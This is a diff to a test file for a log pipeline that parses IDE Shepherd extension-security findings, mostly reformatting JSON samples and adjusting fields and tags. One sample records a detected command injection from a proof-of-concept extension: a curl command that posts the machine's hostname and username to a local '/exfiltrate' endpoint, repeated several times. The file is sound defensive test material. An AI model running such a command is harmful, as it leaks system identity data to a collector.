@@ -3,7 +3,48 @@ id: ide-shepherd
 tests:
  -
   sample: |-
-    {"isAlert":false,"category_uid":2,"metadata":{"product":{"name":"IDE Shepherd","vendor_name":"Datadog"},"environment":{"ide_version":"1.105.1","ide_flavor":"cursor"},"version":"1.6.0"},"finding_info":{"uid":"rust-lang.rust-analyzer-0.3.2769-metadata-analysis","title":"Metadata Analysis: rust-lang.rust-analyzer-0.3.2769","desc":"Detected 0 suspicious pattern(s) (Risk: none, Score: 0)"},"status_id":1,"application":{"uid":"rust-lang.rust-analyzer-0.3.2769","path":"/Users/tesnim.hamdouni/.cursor/extensions/rust-lang.rust-analyzer-0.3.2769-darwin-arm64","name":"rust-lang.rust-analyzer","vendor_name":"rust-lang","version":"0.3.2769"},"activity_id":2,"class_uid":2007,"severity_id":1,"time":1769418941951,"type_uid":200702,"network":{"ip":{"attributes":[{"ip":"127.0.0.1","source":["tags"]}],"list":["127.0.0.1"]}}}
+    {
+      "isAlert" : false,
+      "category_uid" : 2,
+      "metadata" : {
+        "product" : {
+          "name" : "IDE Shepherd",
+          "vendor_name" : "Datadog"
+        },
+        "environment" : {
+          "ide_version" : "1.105.1",
+          "ide_flavor" : "cursor"
+        },
+        "version" : "1.6.0"
+      },
+      "finding_info" : {
+        "uid" : "rust-lang.rust-analyzer-0.3.2769-metadata-analysis",
+        "title" : "Metadata Analysis: rust-lang.rust-analyzer-0.3.2769",
+        "desc" : "Detected 0 suspicious pattern(s) (Risk: none, Score: 0)"
+      },
+      "status_id" : 1,
+      "application" : {
+        "uid" : "rust-lang.rust-analyzer-0.3.2769",
+        "path" : "/Users/tesnim.hamdouni/.cursor/extensions/rust-lang.rust-analyzer-0.3.2769-darwin-arm64",
+        "name" : "rust-lang.rust-analyzer",
+        "vendor_name" : "rust-lang",
+        "version" : "0.3.2769"
+      },
+      "activity_id" : 2,
+      "class_uid" : 2007,
+      "severity_id" : 1,
+      "time" : 1769418941951,
+      "type_uid" : 200702,
+      "network" : {
+        "ip" : {
+          "attributes" : [ {
+            "ip" : "127.0.0.1",
+            "source" : [ "tags" ]
+          } ],
+          "list" : [ "127.0.0.1" ]
+        }
+      }
+    }
   result:
     custom:
       activity_id: 2
@@ -24,6 +65,7 @@ tests:
       ide_shepherd:
         activity_name: "updated"
         class_name: "Application Security Posture Finding"
+        isAlert: false
       isAlert: false
       metadata:
         environment:
@@ -47,13 +89,97 @@ tests:
       time: 1769418941951
       type_uid: 200702
     message: |-
-      {"isAlert":false,"category_uid":2,"metadata":{"product":{"name":"IDE Shepherd","vendor_name":"Datadog"},"environment":{"ide_version":"1.105.1","ide_flavor":"cursor"},"version":"1.6.0"},"finding_info":{"uid":"rust-lang.rust-analyzer-0.3.2769-metadata-analysis","title":"Metadata Analysis: rust-lang.rust-analyzer-0.3.2769","desc":"Detected 0 suspicious pattern(s) (Risk: none, Score: 0)"},"status_id":1,"application":{"uid":"rust-lang.rust-analyzer-0.3.2769","path":"/Users/tesnim.hamdouni/.cursor/extensions/rust-lang.rust-analyzer-0.3.2769-darwin-arm64","name":"rust-lang.rust-analyzer","vendor_name":"rust-lang","version":"0.3.2769"},"activity_id":2,"class_uid":2007,"severity_id":1,"time":1769418941951,"type_uid":200702,"network":{"ip":{"attributes":[{"ip":"127.0.0.1","source":["tags"]}],"list":["127.0.0.1"]}}}
+      {
+        "isAlert" : false,
+        "category_uid" : 2,
+        "metadata" : {
+          "product" : {
+            "name" : "IDE Shepherd",
+            "vendor_name" : "Datadog"
+          },
+          "environment" : {
+            "ide_version" : "1.105.1",
+            "ide_flavor" : "cursor"
+          },
+          "version" : "1.6.0"
+        },
+        "finding_info" : {
+          "uid" : "rust-lang.rust-analyzer-0.3.2769-metadata-analysis",
+          "title" : "Metadata Analysis: rust-lang.rust-analyzer-0.3.2769",
+          "desc" : "Detected 0 suspicious pattern(s) (Risk: none, Score: 0)"
+        },
+        "status_id" : 1,
+        "application" : {
+          "uid" : "rust-lang.rust-analyzer-0.3.2769",
+          "path" : "/Users/tesnim.hamdouni/.cursor/extensions/rust-lang.rust-analyzer-0.3.2769-darwin-arm64",
+          "name" : "rust-lang.rust-analyzer",
+          "vendor_name" : "rust-lang",
+          "version" : "0.3.2769"
+        },
+        "activity_id" : 2,
+        "class_uid" : 2007,
+        "severity_id" : 1,
+        "time" : 1769418941951,
+        "type_uid" : 200702,
+        "network" : {
+          "ip" : {
+            "attributes" : [ {
+              "ip" : "127.0.0.1",
+              "source" : [ "tags" ]
+            } ],
+            "list" : [ "127.0.0.1" ]
+          }
+        }
+      }
     tags:
-     - "source:ide-shepherd"
+     - "source:LOGS_SOURCE"
     timestamp: 1769418941951
  -
   sample: |-
-    {"isAlert":true,"category_uid":2,"metadata":{"product":{"name":"IDE Shepherd","vendor_name":"Datadog"},"environment":{"ide_version":"1.107.0","ide_flavor":"vscode"},"version":"1.6.0"},"resources":[{"uid":"lotm.mal-xt-poc-99.0.0","role_id":3}],"network":{"ip":{"attributes":[{"ip":"127.0.0.1","source":["tags"]}],"list":["127.0.0.1"]}},"observables":[{"type_id":99,"name":"Command Injection","value":"curl -X POST -H \"Content-Type: application/json\" -d \"{\\\"hostname\\\": \\\"$(hostname)\\\", \\\"username\\\": \\\"$(whoami)\\\", \\\"timestamp\\\": \\\"$(date)\\\"}\" http://localhost:55559/exfiltrate "}],"finding_info":{"uid":"fe018e8b-d950-4a91-9714-0601b8c5c66f","title":"Security Detection: Command Injection","desc":"Detected command injection attempt: curl -X POST -H \"Content-Type: application/json\" -d \"{\\\"hostname\\\": \\\"$(hostname)\\\", \\\"username\\\": \\\"$(whoami)\\\", \\\"timestamp\\\": \\\"$(date)\\\"}\" http://localhost:55559/exfiltrate "},"status_id":1,"activity_id":1,"class_uid":2004,"severity_id":4,"time":1768318612012,"type_uid":200401}
+    {
+      "isAlert" : true,
+      "category_uid" : 2,
+      "metadata" : {
+        "product" : {
+          "name" : "IDE Shepherd",
+          "vendor_name" : "Datadog"
+        },
+        "environment" : {
+          "ide_version" : "1.107.0",
+          "ide_flavor" : "vscode"
+        },
+        "version" : "1.6.0"
+      },
+      "resources" : [ {
+        "uid" : "lotm.mal-xt-poc-99.0.0",
+        "role_id" : 3
+      } ],
+      "network" : {
+        "ip" : {
+          "attributes" : [ {
+            "ip" : "127.0.0.1",
+            "source" : [ "tags" ]
+          } ],
+          "list" : [ "127.0.0.1" ]
+        }
+      },
+      "observables" : [ {
+        "type_id" : 99,
+        "name" : "Command Injection",
+        "value" : "curl -X POST -H \"Content-Type: application/json\" -d \"{\\\"hostname\\\": \\\"$(hostname)\\\", \\\"username\\\": \\\"$(whoami)\\\", \\\"timestamp\\\": \\\"$(date)\\\"}\" http://localhost:55559/exfiltrate "
+      } ],
+      "finding_info" : {
+        "uid" : "fe018e8b-d950-4a91-9714-0601b8c5c66f",
+        "title" : "Security Detection: Command Injection",
+        "desc" : "Detected command injection attempt: curl -X POST -H \"Content-Type: application/json\" -d \"{\\\"hostname\\\": \\\"$(hostname)\\\", \\\"username\\\": \\\"$(whoami)\\\", \\\"timestamp\\\": \\\"$(date)\\\"}\" http://localhost:55559/exfiltrate "
+      },
+      "status_id" : 1,
+      "activity_id" : 1,
+      "class_uid" : 2004,
+      "severity_id" : 4,
+      "time" : 1768318612012,
+      "type_uid" : 200401
+    }
   result:
     custom:
       activity_id: 1
@@ -68,6 +194,7 @@ tests:
       ide_shepherd:
         activity_name: "installed"
         class_name: "Detection Finding"
+        isAlert: true
       isAlert: true
       metadata:
         environment:
@@ -88,20 +215,63 @@ tests:
            - "127.0.0.1"
       observables:
        -
-        name: "Command Injection"
         type_id: 99
+        name: "Command Injection"
         value: "curl -X POST -H \"Content-Type: application/json\" -d \"{\\\"hostname\\\": \\\"$(hostname)\\\", \\\"username\\\": \\\"$(whoami)\\\", \\\"timestamp\\\": \\\"$(date)\\\"}\" http://localhost:55559/exfiltrate "
       resources:
        -
-        role_id: 3
         uid: "lotm.mal-xt-poc-99.0.0"
+        role_id: 3
       severity_id: 4
       status_id: 1
       time: 1768318612012
       type_uid: 200401
     message: |-
-      {"isAlert":true,"category_uid":2,"metadata":{"product":{"name":"IDE Shepherd","vendor_name":"Datadog"},"environment":{"ide_version":"1.107.0","ide_flavor":"vscode"},"version":"1.6.0"},"resources":[{"uid":"lotm.mal-xt-poc-99.0.0","role_id":3}],"network":{"ip":{"attributes":[{"ip":"127.0.0.1","source":["tags"]}],"list":["127.0.0.1"]}},"observables":[{"type_id":99,"name":"Command Injection","value":"curl -X POST -H \"Content-Type: application/json\" -d \"{\\\"hostname\\\": \\\"$(hostname)\\\", \\\"username\\\": \\\"$(whoami)\\\", \\\"timestamp\\\": \\\"$(date)\\\"}\" http://localhost:55559/exfiltrate "}],"finding_info":{"uid":"fe018e8b-d950-4a91-9714-0601b8c5c66f","title":"Security Detection: Command Injection","desc":"Detected command injection attempt: curl -X POST -H \"Content-Type: application/json\" -d \"{\\\"hostname\\\": \\\"$(hostname)\\\", \\\"username\\\": \\\"$(whoami)\\\", \\\"timestamp\\\": \\\"$(date)\\\"}\" http://localhost:55559/exfiltrate "},"status_id":1,"activity_id":1,"class_uid":2004,"severity_id":4,"time":1768318612012,"type_uid":200401}
+      {
+        "isAlert" : true,
+        "category_uid" : 2,
+        "metadata" : {
+          "product" : {
+            "name" : "IDE Shepherd",
+            "vendor_name" : "Datadog"
+          },
+          "environment" : {
+            "ide_version" : "1.107.0",
+            "ide_flavor" : "vscode"
+          },
+          "version" : "1.6.0"
+        },
+        "resources" : [ {
+          "uid" : "lotm.mal-xt-poc-99.0.0",
+          "role_id" : 3
+        } ],
+        "network" : {
+          "ip" : {
+            "attributes" : [ {
+              "ip" : "127.0.0.1",
+              "source" : [ "tags" ]
+            } ],
+            "list" : [ "127.0.0.1" ]
+          }
+        },
+        "observables" : [ {
+          "type_id" : 99,
+          "name" : "Command Injection",
+          "value" : "curl -X POST -H \"Content-Type: application/json\" -d \"{\\\"hostname\\\": \\\"$(hostname)\\\", \\\"username\\\": \\\"$(whoami)\\\", \\\"timestamp\\\": \\\"$(date)\\\"}\" http://localhost:55559/exfiltrate "
+        } ],
+        "finding_info" : {
+          "uid" : "fe018e8b-d950-4a91-9714-0601b8c5c66f",
+          "title" : "Security Detection: Command Injection",
+          "desc" : "Detected command injection attempt: curl -X POST -H \"Content-Type: application/json\" -d \"{\\\"hostname\\\": \\\"$(hostname)\\\", \\\"username\\\": \\\"$(whoami)\\\", \\\"timestamp\\\": \\\"$(date)\\\"}\" http://localhost:55559/exfiltrate "
+        },
+        "status_id" : 1,
+        "activity_id" : 1,
+        "class_uid" : 2004,
+        "severity_id" : 4,
+        "time" : 1768318612012,
+        "type_uid" : 200401
+      }
     tags:
-     - "source:ide-shepherd"
+     - "source:LOGS_SOURCE"
     timestamp: 1768318612012
 
